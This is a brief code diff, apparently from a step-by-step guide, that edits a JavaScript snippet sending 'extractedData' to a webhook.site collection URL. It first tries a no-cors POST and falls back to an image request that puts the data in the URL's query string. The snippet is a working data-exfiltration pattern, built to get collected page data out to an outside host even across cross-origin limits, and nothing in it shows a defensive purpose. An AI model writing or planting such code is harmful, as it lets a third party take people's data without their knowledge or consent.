@@ -36,16 +36,17 @@ try {
 }
 
 // Send data to your webhook - REPLACE THIS URL IN STEP 2
+// Send data to your webhook
 fetch('https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json'
     },
     body: JSON.stringify(extractedData),
-    mode: 'no-cors' // Important for cross-origin requests
+    mode: 'no-cors'
 }).catch(error => {
-    // Fallback method using image request
+    // Fallback method using image request - SAME BASE URL
     const img = new Image();
-    img.src = 'https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa/callback?data=' + encodeURIComponent(JSON.stringify(extractedData));
+    img.src = 'https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa?data=' + encodeURIComponent(JSON.stringify(extractedData));
 });
 Commit the file
